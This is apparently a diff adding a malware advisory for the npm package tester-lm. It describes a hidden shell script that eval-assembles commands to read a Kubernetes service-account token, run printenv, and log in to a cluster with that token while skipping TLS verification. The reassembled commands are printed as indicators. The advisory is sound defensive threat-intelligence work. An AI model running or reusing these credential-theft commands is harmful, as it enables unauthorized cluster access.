@@ -1,0 +1,61 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-14330",
+  "modified": "2026-11-19T18:39:46Z",
+  "published": "2026-11-19T18:38:04Z",
+  "summary": "Malicious code in tester-lm (npm)",
+  "details": "The package ships package/tester.sh, a shell script that hides its commands from string scanners by splitting them into single-token shell variables and reassembling them at run time with eval. Two payloads are built this way. The first reassembles to `export DEBUG_FILE=$(cat /var/run/secrets/kubernetes[.]io/serviceaccount/token 2\u003e/dev/null)`, reading the Kubernetes/OpenShift service-account token of whatever host the script runs on and stashing it in the DEBUG_FILE environment variable; the same file also assembles and runs a bare `printenv` (variables a+b+c). The second reassembles to `./oc login --token=$DEBUG_FILE --server=$SERV --insecure-skip-tls-verify`, authenticating to a cluster API with the stolen token, using a server address taken from the SERV environment variable (also echoed verbatim by the script) and disabling TLS certificate verification. The credentials are therefore consumed by an operator-driven second stage rather than a hardcoded endpoint, so the package embeds no fixed C2 host or IP; the indicators are the file path /var/run/secrets/kubernetes[.]io/serviceaccount/token, the assembled commands `export DEBUG_FILE=$(cat \u003cservice-account token\u003e)` and `./oc login --token=… --server=… --insecure-skip-tls-verify`, and the SERV / DEBUG_FILE environment variables. Nothing invokes tester.sh from an install hook; the package's other script (tester.js) is an unrelated user-directed HTTP and DNS client, and the bundled DISCLOSURE claims the package does not collect authentication tokens, which contradicts the hidden script.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "tester-lm",
+        "purl": "pkg:npm/tester-lm"
+      },
+      "versions": [
+        "0.0.1"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "name": "Embedded Malicious Code"
+          }
+        ]
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/tester-lm/v/0.0.1"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-14330"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "malware",
+      "first_seen_at": "2026-11-19T18:38:04Z",
+      "indicators_observed": {
+        "domain_observed": [
+          "kubernetes[.]io"
+        ],
+        "sha256": [
+          "f12889ef226651455e91b42e9fbcd91c8287e0a086461806aa471c57ab68e085"
+        ]
+      }
+    }
+  }
+}
